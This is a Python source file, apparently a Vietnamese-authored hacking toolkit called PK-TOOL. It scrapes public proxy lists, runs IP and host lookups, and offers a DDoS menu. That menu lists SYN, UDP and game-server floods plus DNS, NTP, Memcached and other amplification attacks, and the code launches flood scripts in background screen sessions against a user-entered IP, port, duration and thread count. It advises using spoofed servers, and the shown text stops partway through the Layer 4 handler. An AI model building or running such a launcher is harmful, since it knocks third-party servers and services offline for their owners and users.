#!/usr/bin/env python3

from utils.banner import Count, Bot, AttackSentL4, AttackSentL7
#from requests.structures import CaseInsensitiveDict
from urllib.parse import urlparse
from contextlib import suppress
from shutil import which
from os import system
import os, sys, time, json, subprocess, random
try:
	import speedtest, colorama, requests, httpx
except Exception as e:
	sys.exit(e)

class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET

class Home:
	def __init__(self,
	help,
	dev):
		self.help = help
		self.dev = dev
	def getproxies(self):
#		self.styleText("\n\033[38;5;178mĐợi tao tải proxy cái...\n")
		file_name = "utils/http.txt"
		http_proxies = [
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&ssl=yes",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous",
			"https://raw.githubusercontent.com/Kenne400k/proxy100k/main/proxy100k",
            "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"]
		with open(file_name, 'w'):
			for proxies in http_proxies:
				try:
					if httpx.get(proxies).status_code == 200:
						print(Color.LG+f"[{200}] OK -> {proxies}")
						with open(file_name, 'a') as p:
							p.write(httpx.get(proxies).text)
					else:
						print(Color.LR+f"[{httpx.get(proxies).status_code}] ERROR -> {proxies}")
				except:
					print(Color.LR+f"[ERROR] -> {proxies}")

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): # edit banner bo chat cu nha
		print(f"""

\033[38;5;196m   ▄███████▄    ▄█   ▄█▄     ███      ▄██████▄   ▄██████▄   ▄█       
\033[38;5;197m  ███    ███   ███ ▄███▀ ▀█████████▄ ███    ███ ███    ███ ███       
\033[38;5;198m  ███    ███   ███▐██▀      ▀███▀▀██ ███    ███ ███    ███ ███       
\033[38;5;199m  ███    ███  ▄█████▀        ███   ▀ ███    ███ ███    ███ ███       
\033[38;5;200m▀█████████▀  ▀▀█████▄        ███     ███    ███ ███    ███ ███       
\033[38;5;201m  ███          ███▐██▄       ███     ███    ███ ███    ███ ███       
\033[38;5;202m  ███          ███ ▀███▄     ███     ███    ███ ███    ███ ███▌    ▄ 
\033[38;5;203m ▄████▀        ███   ▀█▀    ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ 
\033[38;5;204m              ▀                                           ▀         
\x1b[38;5;43m-----------------------------------------------------------------------------
\x1b[38;5;45m Tool Code By : Nguyễn Trương Thiện Phát ( Kenne9k )
 Create Tool : T5-06/10/2022
 Update Tool : T5-06/10/2022
""")
		print("\033[38;5;178m""[""\033[38;5;226m01""\033[38;5;178m""]"" \033[38;5;226mProxy")
		print("\033[38;5;179m""[""\033[38;5;227m02""\033[38;5;179m""]"" \033[38;5;227mWebTool")
		print("\033[38;5;180m""[""\033[38;5;228m03""\033[38;5;180m""]"" \033[38;5;228mL4/L7")
		print("\033[38;5;181m""[""\033[38;5;229m04""\033[38;5;181m""]"" \033[38;5;229mSpeedTest")
		print("\033[38;5;182m""[""\033[38;5;230m05""\033[38;5;182m""]"" \033[38;5;230mDev Thông tin người làm")
		print("\n")
		while True:
			try:
				sys.stdout.write("\x1b[38;5;123m╔═══\033[38;5;129m⊢""\x1b[38;5;123mPK-TOOL""\x1b[38;5;123m/Home""\033[38;5;129m⊣""\n\x1b[38;5;123m╚══> \033[38;5;129m")
				option = input()
				if option in ['01', '1']:
					os.system('clear')
					Tool.proxy(option)
				elif option in ['02', '2']:
					os.system('clear')
					Tool.webtools()
				elif option in ['03', '3']:
					os.system('clear')
					Tool.bbos()
				elif option in ['04', '4']:
					os.system('clear')
					Tool.spdtest()
				elif option in ['ref', 'REF']:
					self.home()
				elif option in ['home', 'HOME']:
					self.home()
				elif option in ['clear', 'CLEAR']:
					os.system('clear');F_Tool.home()
				elif option in ['help', 'HELP', '?']:
					print(self.help)
				elif option in ['dev', 'DEV']:
					print(self.dev)
				elif option in ['exit', 'EXIT']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option in ['stop', 'STOP']:
					status.stop()
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
					os.system('clear');Tool.bbos()
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
			except KeyboardInterrupt:
				sys.exit(0)


class response_url:
	def __init__(self,
	headers):
		self.headers = headers

	def lookup(self, url):
		try:
			if url == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
			if resp['status'] == 'success':
				return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']

			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def ip_lookup(self, ip):
		try:
			if ip == '':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()
			if resp['status'] == 'success':
				return Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
			else:
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except KeyError:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."

	def http_status(self, url):
		try:
			if urlparse(url).scheme == "":
				url = "http://"+url
			resp = httpx.get(url, headers=self.headers)
			if resp.status_code == 200:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (OK)"
			elif resp.status_code == 301:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Moved Permanently)"
			elif resp.status_code == 302:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Found)"
			elif resp.status_code == 303:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (See Other)"
			elif resp.status_code == 307:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Temporary Redirect)"
			elif resp.status_code == 400:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Unauthorized)"
			elif resp.status_code == 410:
				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gone)"
			elif resp.status_code == 401:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Requests)"
			elif resp.status_code == 403:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Forbidden)"
			elif resp.status_code == 404:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Not Found)"
			elif resp.status_code == 429:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (To Many Requests)"
			elif resp.status_code == 500:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Internal Server Error)"
			elif resp.status_code == 502:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Gateway)"
			elif resp.status_code == 503:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Service Unavailable)"
			elif resp.status_code == 504:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gateway Timeout)"
			elif resp.status_code == 507:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Insufficient Storage)"
			elif resp.status_code == 508:
				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
			else:
				return Color.LR+f"    [+] Result: (Connection timeout)"

		except httpx.TimeoutException:
			return Color.LR+f"     [+] Result: (Connection timeout)"
		except httpx.ConnectError:
			return Color.LR+f"    [+] Result: Error occurred"
		except httpx.UnsupportedProtocol:
			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"

	def findhost(self, host):
		try:
			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)

			if resp.text == 'error invalid host':
				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
			else:
				return Color.LG+resp.text
		except requests.exceptions.ConnectionError:
			return Color.LR+"Error: Check your Internet Connection."


class Tool:
	def __init__(self,
	help,
	dev,
	headers):
		self.help = help
		self.dev = dev
		self.headers = headers

	def proxy(self, new):
		try:
			with open("utils/url.json", 'r') as p:
				readjson = json.loads(p.read())
		except FileNotFoundError:
			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
		if new in ['ref', 'REF', 'clear', 'CLEAR']:
			os.system('clear')
			F_Tool.styleText("\033[38;5;178m""Downloading New Proxy... Nguyenphat.ml")
		else:
			F_Tool.styleText("\033[38;5;178m""Downloading all proxy ... Nguyenphat.ml")
		try:
			for proxy in readjson['Proxies']:
				if proxy['type'] == 1:
					if requests.get(proxy["url"]).status_code == 200:
						http = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 2:
					if requests.get(proxy["url"]).status_code == 200:
						https = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 3:
					if requests.get(proxy["url"]).status_code == 200:
						socks4 = requests.get(proxy["url"], headers=self.headers).text
				if proxy['type'] == 4:
					if requests.get(proxy["url"]).status_code == 200:
						socks5 = requests.get(proxy["url"], headers=self.headers).text
			os.system('clear')
		except requests.exceptions.ConnectionError:
			sys.exit("\n\033[38;5;178mĐịt mẹ mày kết nối mạng chưa nhóc ?")
		print(f"""

\033[38;5;166m ██▓███   ██▀███   ▒█████  ▒██   ██▒ ██▓▓█████   ██████ 
\033[38;5;167m▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▓█   ▀ ▒██    ▒ 
\033[38;5;168m▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░▒██▒▒███   ░ ▓██▄   
\033[38;5;169m▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ ░██░▒▓█  ▄   ▒   ██▒
\033[38;5;170m▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒░██░░▒████▒▒██████▒▒
\033[38;5;171m▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░░ ▒░ ░▒ ▒▓▒ ▒ ░
\033[38;5;172m░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░ ░ ░  ░░ ░▒  ░ ░
\033[38;5;173m░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ░   ░   ░  ░  ░  
\033[38;5;174m            ░         ░ ░   ░    ░   ░     ░  ░      ░                                                  
                                                        

""")
		print("\033[38;5;178m""[""\033[38;5;226m01""\033[38;5;178m""]"" \033[38;5;226mHTTP PROXY")
		print("\033[38;5;179m""[""\033[38;5;227m02""\033[38;5;179m""]"" \033[38;5;227mHTTPS PROXY")
		print("\033[38;5;180m""[""\033[38;5;228m03""\033[38;5;180m""]"" \033[38;5;228mSOCKS4 PROXY")
		print("\033[38;5;181m""[""\033[38;5;229m04""\033[38;5;181m""]"" \033[38;5;229mSOCKS5 PROXY")
		print("\n")
		while True:
				sys.stdout.write("\x1b[38;5;123m╔═══\033[38;5;129m⊢""\x1b[38;5;123mPK-TOOL""\x1b[38;5;123m/Proxy""\033[38;5;129m⊣""\n\x1b[38;5;123m╚══> \033[38;5;129m")
				option = input()
				if option in ['01', '1']:
					with open("http.txt", 'w') as p:
						p.write(http)
					print(Color.LG+"[+]"+Color.LC+" HTTP Saved to http.txt")
				elif option in ['02', '2']:
					with open("https.txt", 'w') as p:
						p.write(https)
					print(Color.LG+"[+]"+Color.LC+" HTTPS to https.txt")
				elif option in ['03', '3']:
					with open("socks4.txt", 'w') as p:
						p.write(socks4)
					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Saved to socks4.txt")
				elif option in ['04', '4']:
					with open("socks5.txt", 'w') as p:
						p.write(socks5)
					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
				elif option in ['ref', 'REF']:
					self.proxy(option)
				elif option in ['home', 'HOME']:
					F_Tool.home()
				elif option in ['clear', 'CLEAR']:
					os.system('clear')
					self.proxy(option)
				elif option in ['help', 'HELP', '?']:
					print(self.help)
				elif option in ['dev', 'DEV']:
					print(self.dev)
				elif option in ['exit', 'EXIT']:
					subprocess.run(['pkill -f F-Tool.py'], shell=True)
				elif option in ['stop', 'STOP']:
					subprocess.run(['pkill screen'], shell=True)
					print(f"{Color.LG} [!] Attack Stopped!")
				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
					os.system('clear');Tool.bbos()
				elif option == "":
					pass
				else:
					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def webtools(self):
		print(f"""


\033[38;5;166m █     █░▓█████  ▄▄▄▄   ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
\033[38;5;167m▓█░ █ ░█░▓█   ▀ ▓█████▄ ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
\033[38;5;168m▒█░ █ ░█ ▒███   ▒██▒ ▄██▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
\033[38;5;169m░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
\033[38;5;170m░░██▒██▓ ░▒████▒░▓█  ▀█▓  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
\033[38;5;171m░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
\033[38;5;172m  ▒ ░ ░   ░ ░  ░▒░▒   ░     ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
\033[38;5;173m  ░   ░     ░    ░    ░   ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
\033[38;5;174m    ░       ░  ░ ░                   ░ ░      ░ ░      ░  ░
\033[38;5;175m                      ░                                    


""")
		print("\033[38;5;178m""[""\033[38;5;226m01""\033[38;5;178m""]"" \033[38;5;226mLOOK UP")
		print("\033[38;5;179m""[""\033[38;5;227m02""\033[38;5;179m""]"" \033[38;5;227mIP INFO")
		print("\033[38;5;180m""[""\033[38;5;228m03""\033[38;5;180m""]"" \033[38;5;228mHTTP STATUS")
		print("\033[38;5;181m""[""\033[38;5;229m04""\033[38;5;181m""]"" \033[38;5;229mFIND HOST")
		print("\n")
		while True:
			sys.stdout.write("\x1b[38;5;123m╔═══\033[38;5;129m⊢""\x1b[38;5;123mPK-TOOL""\x1b[38;5;123m/Proxy""\033[38;5;129m⊣""\n\x1b[38;5;123m╚══> \033[38;5;129m")
			option = input()
			if option in ['01', '1']:
				while True:
					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = urlparse(lookup)
					host = parser.netloc
					if parser.scheme == 'https' or parser.scheme == 'http':
						host = parser.netloc
					elif parser.scheme == '':
						url = "http://"+parser.path
						parser = urlparse(url)
						host = parser.netloc
					print(response_url(self.headers).lookup(host))
					break
			elif option in ['02', '2']:
				while True:
					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
					print(response_url(self.headers).ip_lookup(ip_lookup))
					break
			elif option in ['03', '3']:
				while True:
					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					print(response_url(self.headers).http_status(http))
					break
			elif option in ['04', '4']:
				while True:
					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
					parser = parse.urlparse(findhost)
					host = parser.netloc
					path = parser.path.replace("/", "")
					if parser.scheme == 'https' or parser.scheme == 'http':
						print(response_url(self.headers).findhost(host))
					elif host == '':
						print(response_url(self.headers).findhost(path))
					break
			elif option in ['ref', 'REF']:
				self.webtools()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.webtools()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def spdtest(self):
		print(f"""{Color.LG}

   __                     _ _____          _
  / _\_ __   ___  ___  __| /__   \___  ___| |_
  \ \| '_ \ / _ \/ _ \/ _` | / /\/ _ \/ __| __|
  _\ \ |_) |  __/  __/ (_| |/ / |  __/\__ \ |_
  \__/ .__/ \___|\___|\__,_|\/   \___||___/\__|
     |_|


""")
		try:
			spdt = speedtest.Speedtest()

			print(Color.LC+"[*] Loading Server List...")
			spdt.get_servers()
			time.sleep(0.1)

			print(Color.LC+"[*] Choosing Best Server...")
			get = spdt.get_best_server()
			time.sleep(0.1)

			print(Color.LC+"\n[+] "+Color.LC+"Host:"+Color.LY+f" {get['host']}")
			time.sleep(0.1)
			print(Color.LC+"[+] "+Color.LC+"Location:"+Color.LY+f" {get['name']}")

			print(Color.LC+"\n[*] Performing Download Test...")
			download_result = spdt.download()

			print(Color.LC+"[*] Performing Upload Test...")
			upload_result = spdt.upload()
			ping_result = spdt.results.ping

			time.sleep(0.1)
			print(Color.LC+"\nResults:\n")
			time.sleep(0.1)
			print(Color.LC+"[+] Download Speed:"+Color.LY+f" {download_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Upload Speed:"+Color.LY+f" {upload_result / 1024 / 1024:.2f} mbps")
			time.sleep(0.1)
			print(Color.LC+"[+] Ping:"+Color.LY+f" {ping_result:.2f} ms")
			print("\n")
		except Exception:
			print(Color.LR+"Error: Check your Internet Connection.\n\n")


	def bbos(self):
		print(Color.LR+"\n\n    [>    "+Color.LG+"Please use spoofed server for the best experience."+Color.LR+"    <]\n\n")
		print("\033[38;5;178m""[""\033[38;5;226m01""\033[38;5;178m""]"" \033[38;5;226mLAYER 4")
		print("\033[38;5;178m""[""\033[38;5;226m02""\033[38;5;178m""]"" \033[38;5;226mLAYER 7")
		print("\033[38;5;178m""[""\033[38;5;226m03""\033[38;5;178m""]"" \033[38;5;226mTH")
		print("\n")
		while True:
			sys.stdout.write("\x1b[38;5;123m╔═══\033[38;5;129m⊢""\x1b[38;5;123mPK-TOOL""\x1b[38;5;123m/L4-L7-TH""\033[38;5;129m⊣""\n\x1b[38;5;123m╚══> \033[38;5;129m")
			option = input()
			if option in ['01', '1']:
				os.system('clear');self.l4()
			elif option in ['02', '2']:
				os.system('clear');self.l7()
			elif option in ['03', '3']:
				os.system('clear');self.th()
			elif option in ['ref', 'REF']:
				Tool.bbos()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.bbos()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'Dev']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l4(self):
		print(f"""
\033[38;5;166m ██▓    ▄▄▄     ▓██   ██▓▓█████  ██▀███      ██    ██
\033[38;5;167m▓██▒   ▒████▄    ▒██  ██▒▓█   ▀ ▓██ ▒ ██▒    ██    ██ 
\033[38;5;168m▒██░   ▒██  ▀█▄   ▒██ ██░▒███   ▓██ ░▄█ ▒    ███████ 
\033[38;5;169m▒██░   ░██▄▄▄▄██  ░ ▐██▓░▒▓█  ▄ ▒██▀▀█▄           ██ 
\033[38;5;170m░██████▒▓█   ▓██▒ ░ ██▒▓░░▒████▒░██▓ ▒██▒        ██  
\033[38;5;171m░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ ░░ ▒░ ░░ ▒▓ ░▒▓░   
\033[38;5;172m░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░  ░ ░  ░  ░▒ ░ ▒░   
\033[38;5;173m  ░ ░    ░   ▒   ▒ ▒ ░░     ░     ░░   ░    
\033[38;5;174m    ░  ░     ░  ░░ ░        ░  ░   ░        
\033[38;5;175m                 ░ ░                        

""")
		print("\033[38;5;178m""[""\033[38;5;40m""01""\033[38;5;178m""]""\033[38;5;226m"" VSE: UDP Valve Source Engine specific flood")
		print("\033[38;5;178m""[""\033[38;5;41m""02""\033[38;5;178m""]""\033[38;5;226m"" SYN: TCP SYN flood")
		print("\033[38;5;178m""[""\033[38;5;42m""03""\033[38;5;178m""]""\033[38;5;226m"" TCP: TCP junk flood")
		print("\033[38;5;178m""[""\033[38;5;43m""04""\033[38;5;178m""]""\033[38;5;226m"" UDP:  UDP junk flood")
		print("\033[38;5;178m""[""\033[38;5;44m""05""\033[38;5;178m""]""\033[38;5;226m"" HTTP: HTTP GET request flood")
		print("\033[38;5;178m""[""\033[38;5;45m""06""\033[38;5;178m""]""\033[38;5;226m"" CPS : Open and close connections with proxy")
		print("\033[38;5;178m""[""\033[38;5;46m""07""\033[38;5;178m""]""\033[38;5;226m"" ICMP : Icmp echo request flood (Layer3)")
		print("\033[38;5;178m""[""\033[38;5;47m""08""\033[38;5;178m""]""\033[38;5;226m"" CONNECTION : Open connection alive with proxy")
		print("\033[38;5;178m""[""\033[38;5;48m""09""\033[38;5;178m""]""\033[38;5;226m"" TS3 : Send Teamspeak 3 Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;49m""10""\033[38;5;178m""]""\033[38;5;226m"" FIVEM : Send Fivem Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;50m""11""\033[38;5;178m""]""\033[38;5;226m"" MEM : Memcached Amplification")
		print("\033[38;5;178m""[""\033[38;5;51m""12""\033[38;5;178m""]""\033[38;5;226m"" NTP : NTP Amplification")
		print("\033[38;5;178m""[""\033[38;5;82m""13""\033[38;5;178m""]""\033[38;5;226m"" MCBOT : Minecraft Bot Attack")
		print("\033[38;5;178m""[""\033[38;5;83m""14""\033[38;5;178m""]""\033[38;5;226m"" MINECRAFT : Minecraft Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;84m""15""\033[38;5;178m""]""\033[38;5;226m"" MCPE : Minecraft PE Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;85m""16""\033[38;5;178m""]""\033[38;5;226m"" DNS : DNS Amplification")
		print("\033[38;5;178m""[""\033[38;5;86m""17""\033[38;5;178m""]""\033[38;5;226m"" CHAR : Chargen Amplification")
		print("\033[38;5;178m""[""\033[38;5;87m""18""\033[38;5;178m""]""\033[38;5;226m"" CLDAP : Cldap Amplification")
		print("\033[38;5;178m""[""\033[38;5;118m""19""\033[38;5;178m""]""\033[38;5;226m"" ARD : Apple Remote Desktop Amplification")
		print("\033[38;5;178m""[""\033[38;5;119m""20""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;246m""00""\033[38;5;178m""]""\033[38;5;226m"" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"P-TOOL"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/vse {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("VSE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '2']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/syn {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("SYN"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['03', '3']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/tcp {ip} {port} {floodtime} 1000 {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("TCP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/udp {ip} {port} {floodtime} 1000 {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("UDP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['05', '5']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("HTTP"))
